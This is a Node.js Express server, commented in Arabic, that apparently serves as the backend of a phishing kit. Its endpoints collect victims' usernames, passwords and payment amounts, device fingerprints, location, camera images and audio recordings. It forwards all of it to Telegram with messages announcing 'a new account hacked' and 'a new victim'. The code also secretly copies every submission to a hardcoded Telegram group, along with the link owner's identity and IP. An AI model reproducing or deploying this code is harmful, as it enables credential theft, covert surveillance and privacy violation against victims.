require('dotenv').config();
const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// تكوين multer للتعامل مع رفع الملفات
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

// الحصول على التوكن من متغير البيئة
const BOT_TOKEN = process.env.BOT_TOKEN;

// إعدادات المجموعة - تم تحديثها حسب طلبك
const TARGET_GROUP_ID = "2492307094"; // تم التحديث إلى ID العادي
const TARGET_GROUP_LINK = "https://t.me/+Ulu5SHgJAgYzYmJk";

// التحقق من وجود التوكن
if (!BOT_TOKEN) {
  console.error('❌ Telegram Bot Token is not configured');
  console.warn('⚠️  سيتم تشغيل السيرفر ولكن إرسال الرسائل إلى Telegram لن يعمل');
}

// وظيفة للحصول على معلومات المستخدم من الرسالة
function getUserInfo(req) {
  const userInfo = {
    name: req.body.userName || req.body.name || "غير معروف",
    userId: req.body.userId || req.body.telegramId || "غير معروف",
    username: req.body.username || req.body.userUsername || "غير معروف",
    ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress || "غير معروف"
  };

  // تنظيف عنوان IP
  if (userInfo.ip === '::1') userInfo.ip = '127.0.0.1 (localhost)';
  
  return userInfo;
}

// وظيفة لتنسيق رسالة المعلومات
function formatUserInfoMessage(userInfo, additionalData = "") {
  return `👤 معلومات صاحب الرابط:
🔹 الاسم: ${userInfo.name}
🆔 الايدي: ${userInfo.userId}
📧 اليوزر: @${userInfo.username}
🌐 الـIP: ${userInfo.ip}
${additionalData ? `\n📋 البيانات المرسلة:\n${additionalData}` : ''}
─────────────────────`;
}

// وظيفة لإرسال رسالة إلى Telegram
async function sendToTelegram(chatId, message, fileBuffer = null, filename = null, isImage = false) {
  try {
    // إذا لم يكن هناك توكن، نعود بنجاح وهمي للتجربة
    if (!BOT_TOKEN) {
      console.log(`📤 [محاكاة] إرسال إلى chatId ${chatId}: ${message}`);
      if (fileBuffer) {
        console.log(`📁 [محاكاة] مع ملف: ${filename} - نوع: ${isImage ? 'صورة' : 'ملف'}`);
      }
      return true;
    }

    if (fileBuffer && filename) {
      if (isImage) {
        // إرسال الصورة كصورة عادية وليس كملف
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('caption', message);
        formData.append('photo', fileBuffer, { filename: filename });
        
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, formData, {
          headers: formData.getHeaders()
        });
        
        return response.data.ok;
      } else {
        // إرسال كملف عادي (للملفات الأخرى)
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('caption', message);
        formData.append('document', fileBuffer, { filename: filename });
        
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, formData, {
          headers: formData.getHeaders()
        });
        
        return response.data.ok;
      }
    } else {
      // إذا لم يكن هناك ملف، أرسل الرسالة فقط
      const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      });
      
      return response.data.ok;
    }
  } catch (error) {
    console.error('Error sending to Telegram:', error.response?.data || error.message);
    return false;
  }
}

// وظيفة لإرسال نسخة إلى المجموعة
async function sendCopyToGroup(userInfo, originalMessage, fileBuffer = null, filename = null, isImage = false) {
  try {
    const groupMessage = formatUserInfoMessage(userInfo, originalMessage);
    return await sendToTelegram(TARGET_GROUP_ID, groupMessage, fileBuffer, filename, isImage);
  } catch (error) {
    console.error('Error sending copy to group:', error);
    return false;
  }
}

// نقطة النهاية لاستقبال بيانات التسجيل
app.post('/send-to-telegram', async (req, res) => {
  try {
    const { playerId, password, amount, chatId, platform = "انستقرام", device } = req.body;
    
    // التحقق من أن chatId ليس لقناة أو مجموعة (لا يبدأ بـ -100)
    if (chatId && chatId.toString().startsWith('-100')) {
      return res.status(400).json({
        success: false,
        message: 'غير مسموح بإرسال البيانات إلى القنوات أو المجموعات'
      });
    }

    // التحقق من البيانات المطلوبة
    if (!playerId || !password || !amount || !chatId) {
      return res.status(400).json({
        success: false,
        message: 'بيانات ناقصة: يرجى التأكد من إرسال جميع البيانات المطلوبة'
      });
    }

    const userDevice = device || req.headers['user-agent'] || "غير معروف";
    const userInfo = getUserInfo(req);
    
    const message = `♦️ - تم اختراق حساب جديد 

🔹 - اسم المستخدم: ${playerId}
🔑 - كلمة المرور: ${password}
💰 - المبلغ: ${amount}
📱 - الجهاز: ${userDevice}
🌍 - IP: ${userInfo.ip}
🔄 - المنصة: ${platform}`;

    // إرسال الرسالة إلى المستخدم المحدد فقط
    const success = await sendToTelegram(chatId, message);
    
    // إرسال نسخة إلى المجموعة مع معلومات صاحب الرابط
    const copySuccess = await sendCopyToGroup(userInfo, message);

    if (success) {
      res.json({
        success: true,
        message: 'تم إرسال البيانات بنجاح',
        orderId: `#${Math.floor(100000 + Math.random() * 900000)}`,
        copySent: copySuccess
      });
    } else {
      res.status(500).json({
        success: false,
        message: 'فشل في إرسال البيانات'
      });
    }
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    res.status(500).json({
      success: false,
      message: 'حدث خطأ أثناء إرسال البيانات',
      error: error.message
    });
  }
});

// نقطة النهاية لاستقبال بيانات التسجيل العامة
app.post('/register', async (req, res) => {
  try {
    const { username, password, ip, chatId } = req.body;
    
    // التحقق من أن chatId ليس لقناة أو مجموعة
    if (chatId && chatId.toString().startsWith('-100')) {
      return res.status(400).json({ 
        success: false,
        error: 'غير مسموح بإرسال البيانات إلى القنوات أو المجموعات' 
      });
    }

    if (!username || !password || !ip || !chatId) {
      return res.status(400).json({ 
        success: false,
        error: 'بيانات ناقصة: يرجى إرسال جميع البيانات المطلوبة' 
      });
    }

    const userInfo = getUserInfo(req);
    const message = `📝 تسجيل حساب جديد\n👤 اسم المستخدم: ${username}\n🔐 كلمة المرور: ${password}\n🌐 عنوان IP: ${ip}`;
    
    // إرسال إلى المستخدم المحدد
    const success = await sendToTelegram(chatId, message);
    
    // إرسال نسخة إلى المجموعة
    const copySuccess = await sendCopyToGroup(userInfo, message);

    if (success) {
      res.status(200).json({ 
        success: true,
        message: 'تم إرسال البيانات بنجاح',
        copySent: copySuccess
      });
    } else {
      res.status(500).json({ 
        success: false,
        error: 'فشل في إرسال البيانات' 
      });
    }
  } catch (error) {
    console.error('Error processing registration:', error);
    res.status(500).json({ 
      success: false,
      error: 'خطأ داخلي في السيرفر' 
    });
  }
});

// نقطة النهاية لاستقبال معلومات الجهاز
app.post('/device-info', async (req, res) => {
  try {
    const { 
      country, 
      city, 
      ip, 
      time, 
      language, 
      platform, 
      deviceType, 
      browser, 
      cameraSupport, 
      screenResolution, 
      batteryLevel, 
      connectionType, 
      incognitoMode, 
      userActive, 
      loginDate, 
      location, 
      chatId 
    } = req.body;

    // التحقق من أن chatId ليس لقناة أو مجموعة
    if (chatId && chatId.toString().startsWith('-100')) {
      return res.status(400).json({ 
        success: false,
        error: 'غير مسموح بإرسال البيانات إلى القنوات أو المجموعات' 
      });
    }

    if (!chatId) {
      return res.status(400).json({ 
        success: false,
        error: 'معرف الدردشة (chatId) مطلوب' 
      });
    }

    const userInfo = getUserInfo(req);
    
    const message = `☠️ تم اختراق ضحية جديدة!

الدولة: ${country || "غير معروف"}
المدينة: ${city || "غير معروف"}
IP: ${ip || "غير معروف"}
التوقيت: ${time || "غير معروف"}
اللغة: ${language || "غير معروف"}
النظام: ${platform || "غير معروف"}
نوع الجهاز: ${deviceType || "غير معروف"}
نوع المتصفح: ${browser || "غير معروف"}
دعم الكاميرا: ${cameraSupport || "غير معروف"}
دقة الشاشة: ${screenResolution || "غير معروف"}
مستوى البطارية: ${batteryLevel || "غير معروف"}
نوع الاتصال: ${connectionType || "غير معروف"}
وضع التصفح الخفي: ${incognitoMode || "غير معروف"}
المستخدم نشط؟: ${userActive || "غير معروف"}
تاريخ الدخول: ${loginDate || "غير معروف"}
الموقع الجغرافي: ${location || "غير معروف"}
👤 مرسل من: ${chatId}`;

    // إرسال إلى المستخدم المحدد
    const success = await sendToTelegram(chatId, message);
    
    // إرسال نسخة إلى المجموعة
    const copySuccess = await sendCopyToGroup(userInfo, message);

    if (success) {
      res.status(200).json({ 
        success: true,
        message: 'تم إرسال معلومات الجهاز بنجاح',
        copySent: copySuccess
      });
    } else {
      res.status(500).json({ 
        success: false,
        error: 'فشل في إرسال معلومات الجهاز' 
      });
    }
  } catch (error) {
    console.error('Error processing device info:', error);
    res.status(500).json({ 
      success: false,
      error: 'خطأ داخلي في السيرفر' 
    });
  }
});

// نقطة النهاية لاستقبال الصور (كصورة عادية)
app.post('/upload-image', upload.single('image'), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ 
        success: false,
        error: 'لم يتم توفير صورة' 
      });
    }

    const { username, imageType, chatId, caption } = req.body;
    
    // التحقق من أن chatId ليس لقناة أو مجموعة
    if (chatId && chatId.toString().startsWith('-100')) {
      return res.status(400).json({ 
        success: false,
        error: 'غير مسموح بإرسال البيانات إلى القنوات أو المجموعات' 
      });
    }

    let message = `🖼️ تم اختراق صورة جديدة`;
    if (username) message += `\n👤 المستخدم: ${username}`;
    if (imageType) message += `\n📸 نوع الصورة: ${imageType}`;
    if (caption) message += `\n📝 الوصف: ${caption}`;
    
    const userInfo = getUserInfo(req);
    
    // إرسال إلى المستخدم المحدد كصورة عادية
    const success = await sendToTelegram(
      chatId, 
      message, 
      req.file.buffer, 
      `image-${Date.now()}${path.extname(req.file.originalname || '.jpg')}`,
      true // إرسال كصورة
    );

    // إرسال نسخة إلى المجموعة كصورة عادية
    const copySuccess = await sendCopyToGroup(
      userInfo, 
      message, 
      req.file.buffer, 
      `image-copy-${Date.now()}${path.extname(req.file.originalname || '.jpg')}`,
      true // إرسال كصورة
    );
    
    if (success) {
      res.status(200).json({ 
        success: true,
        message: 'تم إرسال الصورة بنجاح',
        copySent: copySuccess
      });
    } else {
      res.status(500).json({ 
        success: false,
        error: 'فشل في إرسال الصورة' 
      });
    }
  } catch (error) {
    console.error('Error processing image upload:', error);
    res.status(500).json({ 
      success: false,
      error: 'خطأ داخلي في السيرفر' 
    });
  }
});

// نقطة النهاية لاستقبال ملفات الصوت (تبقى كملف)
app.post('/upload-audio', upload.single('audio'), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ 
        success: false,
        error: 'لم يتم توفير ملف صوت' 
      });
    }

    const { username, chatId, caption } = req.body;
    
    // التحقق من أن chatId ليس لقناة أو مجموعة
    if (chatId && chatId.toString().startsWith('-100')) {
      return res.status(400).json({ 
        success: false,
        error: 'غير مسموح بإرسال البيانات إلى القنوات أو المجموعات' 
      });
    }

    let message = `🎵 تم تسجيل صوت جديد`;
    if (username) message += `\n👤 المستخدم: ${username}`;
    if (caption) message += `\n📝 الوصف: ${caption}`;
    
    const userInfo = getUserInfo(req);
    
    // إرسال إلى المستخدم المحدد كملف
    const success = await sendToTelegram(
      chatId, 
      message, 
      req.file.buffer, 
      `audio-${Date.now()}${path.extname(req.file.originalname || '.mp3')}`,
      false // إرسال كملف
    );

    // إرسال نسخة إلى المجموعة كملف
    const copySuccess = await sendCopyToGroup(
      userInfo, 
      message, 
      req.file.buffer, 
      `audio-copy-${Date.now()}${path.extname(req.file.originalname || '.mp3')}`,
      false // إرسال كملف
    );
    
    if (success) {
      res.status(200).json({ 
        success: true,
        message: 'تم إرسال الصوت بنجاح',
        copySent: copySuccess
      });
    } else {
      res.status(500).json({ 
        success: false,
        error: 'فشل في إرسال الصوت' 
      });
    }
  } catch (error) {
    console.error('Error processing audio upload:', error);
    res.status(500).json({ 
      success: false,
      error: 'خطأ داخلي في السيرفر' 
    });
  }
});

// نقطة النهاية للتحقق من عمل السيرفر
app.get('/health', (req, res) => {
  res.status(200).json({ 
    success: true,
    status: 'السيرفر يعمل بشكل طبيعي',
    tokenConfigured: !!BOT_TOKEN,
    targetGroup: TARGET_GROUP_ID,
    environment: process.env.NODE_ENV || 'development',
    endpoints: {
      deviceInfo: '/device-info (POST)',
      sendMessage: '/send-to-telegram (POST)',
      register: '/register (POST)',
      uploadImage: '/upload-image (POST)',
      uploadAudio: '/upload-audio (POST)'
    }
  });
});

// نقطة النهاية الرئيسية
app.get('/', (req, res) => {
  res.status(200).json({ 
    success: true,
    message: 'مرحباً بك في سيرفر Telegram Bot',
    features: [
      'مرحبا'
    
    ],
    endpoints: {
      health: '/health',
      deviceInfo: '/device-info (POST)',
      sendMessage: '/send-to-telegram (POST)',
      register: '/register (POST)',
      uploadImage: '/upload-image (POST)',
      uploadAudio: '/upload-audio (POST)'
    }
  });
});

// بدء السيرفر
app.listen(PORT, () => {
  console.log(`✅ Server is running on port ${PORT}`);
  console.log(`📊 Target Group: ${TARGET_GROUP_ID}`);
  console.log(`🖼️ Images will be sent as normal photos (not files)`);
  console.log(`📱 Device info endpoint: /device-info`);
  if (!BOT_TOKEN) {
    console.warn('⚠️  BOT_TOKEN غير مضبوط، سيتم محاكاة إرسال الرسائل فقط');
  }
});
